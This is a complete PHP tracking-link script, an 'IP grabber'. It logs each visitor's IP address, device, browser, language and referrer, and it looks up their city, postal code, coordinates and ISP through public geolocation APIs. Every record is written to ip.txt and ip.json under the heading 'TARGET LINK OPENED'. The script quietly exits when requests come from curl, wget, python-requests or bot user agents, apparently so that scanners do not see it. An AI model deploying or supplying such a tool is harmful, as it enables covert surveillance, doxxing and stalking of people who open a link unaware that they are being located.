<?php

// Get real IP address with fallback chain
$ipaddress = '';

// Try multiple methods to get real IP (handles proxies, VPNs, etc.)
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ipaddress = trim($ips[0]);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
} elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
} elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

// Validate IP format
if (!filter_var($ipaddress, FILTER_VALIDATE_IP)) {
    $ipaddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

// Skip logging for internal health checks (localhost) or automated agents
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (strpos($ipaddress, '127.') === 0 || $ipaddress === '::1' || $ipaddress === 'UNKNOWN' || preg_match('/curl|wget|python-requests|healthcheck|bot|spider/i', $ua)) {
    exit;
}

// Get browser user agent
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Parse user agent for detailed device info
$device_info = parse_user_agent($browser);

// Get timestamp
$timestamp = date('Y-m-d H:i:s');
$timestamp_unix = time();

// Get IP Geolocation info
$geo_info = get_ip_geolocation($ipaddress);

// Get additional headers
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
$accept_encoding = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

// Create detailed structured log entry
$log_entry = "╔" . str_repeat("═", 78) . "╗\n";
$log_entry .= "║ [" . $timestamp . "] TARGET LINK OPENED\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ IP ADDRESS: " . trim($ipaddress) . "\n";
$log_entry .= "║ GEOLOCATION: " . $geo_info['country'] . " | " . $geo_info['city'] . " | " . $geo_info['postal_code'] . "\n";
$log_entry .= "║ COORDINATES: Lat " . $geo_info['latitude'] . " | Lon " . $geo_info['longitude'] . "\n";
$log_entry .= "║ ISP/PROVIDER: " . $geo_info['isp'] . "\n";
$log_entry .= "║ ORGANIZATION: " . $geo_info['organization'] . "\n";
$log_entry .= "║ AS NUMBER: " . $geo_info['as_name'] . "\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ DEVICE INFO:\n";
$log_entry .= "║   OS: " . $device_info['os'] . "\n";
$log_entry .= "║   BROWSER: " . $device_info['browser'] . "\n";
$log_entry .= "║   DEVICE TYPE: " . $device_info['device_type'] . "\n";
$log_entry .= "║   DEVICE NAME: " . $device_info['device_name'] . "\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ CONNECTION INFO:\n";
$log_entry .= "║   LANGUAGE: " . $accept_language . "\n";
$log_entry .= "║   ENCODING: " . $accept_encoding . "\n";
$log_entry .= "║   REFERER: " . $referer . "\n";
$log_entry .= "║   TIMEZONE: " . date('T') . " (UTC" . date('O') . ")\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ FULL USER-AGENT: " . $browser . "\n";
$log_entry .= "╚" . str_repeat("═", 78) . "╝\n\n";

// Write to IP log file
$file = 'ip.txt';
$fp = fopen($file, 'a');
if ($fp) {
    fwrite($fp, $log_entry);
    fclose($fp);
}

// Create comprehensive JSON log
$json_file = 'ip.json';
$json_entry = [
    'timestamp' => $timestamp,
    'timestamp_unix' => $timestamp_unix,
    'ip' => trim($ipaddress),
    'geolocation' => [
        'country' => $geo_info['country'],
        'city' => $geo_info['city'],
        'postal_code' => $geo_info['postal_code'],
        'isp' => $geo_info['isp'],
        'as_name' => $geo_info['as_name'],
        'organization' => $geo_info['organization'],
        'latitude' => $geo_info['latitude'],
        'longitude' => $geo_info['longitude'],
        'timezone' => date('T'),
        'timezone_offset' => date('O')
    ],
    'device' => [
        'os' => $device_info['os'],
        'browser' => $device_info['browser'],
        'device_type' => $device_info['device_type'],
        'device_name' => $device_info['device_name']
    ],
    'connection' => [
        'user_agent' => $browser,
        'accept_language' => $accept_language,
        'accept_encoding' => $accept_encoding,
        'referer' => $referer
    ],
    'server_info' => [
        'server_time' => $timestamp,
        'server_timezone' => date('T'),
        'server_utc_offset' => date('O')
    ],
    'action' => 'link_opened'
];

$existing = [];
if (file_exists($json_file)) {
    $json_content = file_get_contents($json_file);
    $existing = json_decode($json_content, true) ?? [];
}
$existing[] = $json_entry;
file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

// Helper function to parse user agent
function parse_user_agent($ua) {
    $result = [
        'os' => 'Unknown',
        'browser' => 'Unknown',
        'device_type' => 'Unknown',
        'device_name' => 'Unknown'
    ];
    
    // Detect OS
    if (preg_match('/Windows NT 10.0/', $ua)) $result['os'] = 'Windows 10';
    elseif (preg_match('/Windows NT 11.0/', $ua)) $result['os'] = 'Windows 11';
    elseif (preg_match('/Windows NT 6.3/', $ua)) $result['os'] = 'Windows 8.1';
    elseif (preg_match('/Windows NT 6.2/', $ua)) $result['os'] = 'Windows 8';
    elseif (preg_match('/Windows NT 6.1/', $ua)) $result['os'] = 'Windows 7';
    elseif (preg_match('/Mac OS X/', $ua)) $result['os'] = 'macOS';
    elseif (preg_match('/iPhone/', $ua)) $result['os'] = 'iOS';
    elseif (preg_match('/iPad/', $ua)) $result['os'] = 'iPadOS';
    elseif (preg_match('/Android/', $ua)) $result['os'] = 'Android';
    elseif (preg_match('/Linux/', $ua)) $result['os'] = 'Linux';
    
    // Detect Browser
    if (preg_match('/Chrome/', $ua)) $result['browser'] = 'Chrome';
    elseif (preg_match('/Safari/', $ua)) $result['browser'] = 'Safari';
    elseif (preg_match('/Firefox/', $ua)) $result['browser'] = 'Firefox';
    elseif (preg_match('/Edge/', $ua)) $result['browser'] = 'Edge';
    elseif (preg_match('/Opera/', $ua)) $result['browser'] = 'Opera';
    
    // Detect Device Type
    if (preg_match('/Mobile|Android|iPhone|iPad/', $ua)) {
        $result['device_type'] = 'Mobile';
        if (preg_match('/iPad/', $ua)) $result['device_type'] = 'Tablet';
    } else {
        $result['device_type'] = 'Desktop';
    }
    
    // Extract device name
    if (preg_match('/iPhone/', $ua)) $result['device_name'] = 'iPhone';
    elseif (preg_match('/iPad/', $ua)) $result['device_name'] = 'iPad';
    elseif (preg_match('/Android/', $ua)) {
        if (preg_match('/SM-/', $ua)) $result['device_name'] = 'Samsung';
        elseif (preg_match('/Pixel/', $ua)) $result['device_name'] = 'Google Pixel';
        else $result['device_name'] = 'Android Device';
    } else {
        $result['device_name'] = 'Computer';
    }
    
    return $result;
}

// Helper function to get IP geolocation
function get_ip_geolocation($ip) {
    $result = [
        'country' => 'Unknown',
        'city' => 'Unknown',
        'postal_code' => 'Unknown',
        'isp' => 'Unknown',
        'as_name' => 'Unknown',
        'organization' => 'Unknown',
        'latitude' => 'N/A',
        'longitude' => 'N/A'
    ];
    
    // Try to get geolocation from free API
    $cache_file = 'geo_cache_' . md5($ip) . '.json';
    
    if (file_exists($cache_file)) {
        $cached = json_decode(file_get_contents($cache_file), true);
        if ($cached && time() - $cached['cached_at'] < 86400) { // 24 hour cache
            return $cached['data'];
        }
    }
    
    // Try multiple free geolocation APIs
    $apis = [
        'https://ipapi.co/' . $ip . '/json/',
        'https://ip-api.com/json/' . $ip . '?fields=country,city,postal,isp,as,org,lat,lon',
        'https://ipwho.is/' . $ip
    ];
    
    foreach ($apis as $api) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 3,
                'user_agent' => 'Mozilla/5.0'
            ]
        ]);
        
        $response = @file_get_contents($api, false, $context);
        if ($response) {
            $data = json_decode($response, true);
            
            if ($data) {
                // Parse different API response formats
                if (isset($data['country_name'])) {
                    // ipapi.co format
                    $result['country'] = $data['country_name'] ?? $data['country'] ?? 'Unknown';
                    $result['city'] = $data['city'] ?? 'Unknown';
                    $result['postal_code'] = $data['postal'] ?? $data['postal_code'] ?? 'Unknown';
                    $result['isp'] = $data['org'] ?? $data['isp'] ?? 'Unknown';
                    $result['as_name'] = $data['asn'] ?? $data['as_name'] ?? 'Unknown';
                    $result['organization'] = $data['org'] ?? $data['organization'] ?? 'Unknown';
                    $result['latitude'] = $data['latitude'] ?? 'N/A';
                    $result['longitude'] = $data['longitude'] ?? 'N/A';
                    break;
                } elseif (isset($data['country'])) {
                    // ip-api.com format
                    $result['country'] = $data['country'] ?? 'Unknown';
                    $result['city'] = $data['city'] ?? 'Unknown';
                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
                    $result['isp'] = $data['isp'] ?? 'Unknown';
                    $result['as_name'] = $data['as'] ?? 'Unknown';
                    $result['organization'] = $data['org'] ?? 'Unknown';
                    $result['latitude'] = $data['lat'] ?? 'N/A';
                    $result['longitude'] = $data['lon'] ?? 'N/A';
                    break;
                } elseif (isset($data['type']) && $data['type'] === 'IPv4') {
                    // ipwho.is format (different structure)
                    $result['country'] = $data['country'] ?? 'Unknown';
                    $result['city'] = $data['city'] ?? 'Unknown';
                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
                    $result['isp'] = $data['connection']['isp'] ?? 'Unknown';
                    $result['as_name'] = 'AS' . ($data['connection']['asn'] ?? 'Unknown');
                    $result['organization'] = $data['connection']['org'] ?? 'Unknown';
                    $result['latitude'] = $data['latitude'] ?? 'N/A';
                    $result['longitude'] = $data['longitude'] ?? 'N/A';
                    break;
                }
            }
        }
    }
    
    // Cache the result
    $cache_data = [
        'cached_at' => time(),
        'data' => $result
    ];
    file_put_contents($cache_file, json_encode($cache_data));
    
    return $result;
}

?>
